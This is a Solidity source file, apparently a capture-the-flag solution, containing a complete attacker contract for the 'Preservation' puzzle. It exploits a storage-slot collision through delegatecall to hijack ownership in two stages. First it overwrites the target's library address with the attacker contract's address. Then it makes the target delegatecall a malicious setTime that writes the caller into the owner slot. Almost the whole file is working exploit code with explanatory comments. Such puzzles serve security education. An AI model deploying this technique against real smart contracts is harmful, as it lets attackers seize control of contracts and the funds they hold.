// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

/**
 * @title PreservationAttacker
 * @notice Exploits storage collision vulnerability via delegatecall in Preservation contract
 * @dev This contract acts as a malicious library to hijack ownership through storage slot manipulation
 *
 * Attack Strategy:
 * 1. Stage 1: Call setFirstTime() with this contract's address (as uint256)
 *    - Overwrites Preservation's timeZone1Library (slot 0) with attacker address
 * 2. Stage 2: Call setFirstTime() again with desired owner address (as uint256)
 *    - Delegatecalls to our malicious setTime() which writes to slot 2 (owner)
 */
contract PreservationAttacker {
    // Storage layout MUST match Preservation contract to exploit storage collision
    // When delegatecall executes, storage slots are accessed by POSITION, not by name
    address public timeZone1Library;  // Slot 0 - matches Preservation's timeZone1Library
    address public timeZone2Library;  // Slot 1 - matches Preservation's timeZone2Library
    address public owner;             // Slot 2 - matches Preservation's owner (TARGET!)

    address public target;            // Slot 3 - stores Preservation contract address

    /**
     * @notice Constructor to set the target Preservation contract
     * @param _target Address of the Preservation contract to attack
     */
    constructor(address _target) {
        target = _target;
    }

    /**
     * @notice Malicious setTime function that overwrites owner (slot 2)
     * @dev This function is called via delegatecall from Preservation
     *      When executed in Preservation's context, writing to 'owner' writes to Preservation's slot 2
     * @param _owner The address to set as owner (passed as uint256, converted to address)
     */
    function setTime(uint256 _owner) public {
        // Convert uint256 back to address using uint160 intermediate cast
        // Addresses are 160 bits (20 bytes), not 256 bits
        owner = address(uint160(_owner));
    }

    /**
     * @notice Execute the two-stage attack to claim ownership
     * @dev Stage 1: Replace library address with this contract
     *      Stage 2: Call malicious library to set owner to msg.sender
     */
    function attack() external {
        IPreservation preservation = IPreservation(target);

        // Stage 1: Overwrite Preservation's timeZone1Library (slot 0) with this contract's address
        // Convert address to uint256 for the function call
        uint256 attackerAddressAsUint = uint256(uint160(address(this)));
        preservation.setFirstTime(attackerAddressAsUint);

        // Stage 2: Now timeZone1Library points to us, call setFirstTime again
        // This delegatecalls to OUR setTime() which writes to slot 2 (owner)
        uint256 newOwnerAsUint = uint256(uint160(msg.sender));
        preservation.setFirstTime(newOwnerAsUint);
    }
}
